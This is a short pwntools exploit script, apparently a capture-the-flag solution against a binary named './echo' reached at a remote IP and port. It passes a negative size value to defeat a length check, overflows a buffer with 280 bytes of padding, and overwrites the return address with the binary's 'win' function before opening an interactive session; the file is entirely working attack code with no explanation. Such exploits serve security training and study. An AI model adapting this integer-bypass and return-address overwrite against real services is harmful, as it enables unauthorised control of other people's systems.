from pwn import *

binary = './echo'
elf = ELF(binary)
win_function_address = elf.symbols['win']
#p = process(binary)
p = remote("34.170.146.252", 62534)
p.recvuntil(b"Size: ")

p.sendline(b"-2147483648")

p.recvuntil(b"Data: ")

padding = b'A' * 280
return_address = p32(win_function_address) 

payload = padding + return_address
p.sendline(payload)
p.interactive()